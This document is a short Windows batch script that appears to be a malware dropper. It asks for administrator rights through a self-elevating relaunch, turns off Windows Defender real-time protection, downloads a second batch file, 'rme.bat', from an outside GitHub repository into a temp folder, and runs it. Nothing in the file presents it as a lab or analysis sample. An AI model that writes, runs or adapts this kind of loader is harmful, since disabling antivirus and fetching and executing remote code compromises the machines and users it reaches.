@echo off
set "folder=%temp%\tmp237"

:checkPrivileges
net session >nul 2>&1
if %errorLevel% == 0 (
    goto adminActions
) else (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

:adminActions
mkdir "%folder%"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/okfv/testrepos1/blob/main/rme.bat' -OutFile '%folder%\rme.bat'"
start "" "%folder%\rme.bat"
exit
